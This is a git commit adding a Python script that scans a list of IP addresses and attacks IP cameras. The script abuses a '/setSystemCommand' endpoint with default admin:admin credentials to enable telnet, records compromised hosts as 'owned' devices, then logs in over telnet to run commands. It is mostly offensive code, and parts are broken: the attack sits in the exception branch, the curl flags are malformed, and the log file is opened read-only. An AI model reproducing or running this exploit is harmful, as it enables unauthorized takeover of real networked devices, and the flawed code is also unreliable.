bf73a79849f7e9f577feed31e6e7b05e7f4ac958
sirjudge <nico.a.judge@gmail.com>
2017-11-27 11:11:06 -0500

    Wrote some base code, initialized repository

---
+++ main.py
@@ -0,0 +1,57 @@
+import os
+import ipaddress
+import shlex
+import subprocess
+import telnetlib
+
+
+def curlInjection(ip):
+    cmd = "curl 'http://" + ip + "/setSystemCommand' " \
+                                 "--user admin:admin " \
+                                 "- H 'Authorization: Basic $BASICAUTH_CREDS' " \
+                                 "- H 'Content-Type: application/x-www-form-urlencoded' - " \
+                                 "-data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm" \
+                                 "&SystemCommand=telnetd&ConfigSystemCommand=Save'"
+    os.system(cmd)
+
+
+if __name__ == '__main__':
+    ipLog = open('ipList.txt')
+    ownedDevice = open('theMemesOfProduction.txt')
+    for x in ipLog:
+        currIP = ipaddress.ip_address(x)
+        cmd = shlex.split("ping " + x)
+        # ping the IP address
+        try:
+            output = subprocess.check_output(cmd)
+        except:
+            # If ping does not reach given IP skip the IP
+            if subprocess.CalledProcessError:
+                # Will print the command failed with its exit status
+                print("The IP {0} is Not Reachable".format(cmd[-1]))
+                pass
+            # If it can reach the IP address, then we can continue the attack
+            else:
+                print("The IP {0} is Reachable".format(cmd[-1]))
+                # Telnet injection stuff here
+                curlInjection(x)
+                # save IP address to a file of owned devices
+                ownedDevice.write(x + '\n')
+                # Camera's IP address
+                HOST = x
+                # brute force your way maybe?
+                user = 'admin'
+                password = 'admin'
+
+                PORT = 23
+                # Connect to Camera's IP through telnet server using username and password
+                tn = telnetlib.Telnet(HOST, PORT)
+                tn.read_until("login: ")
+                tn.write(user + "\r\n")
+                tn.read_until("password: ")
+                tn.write(password + "\r\n")
+
+                # run uname to determine if we have the right camera
+                tn.write("uname -a \r\n")
+                ret1 = tn.read_eager()
+                print(ret1)  # or use however you want
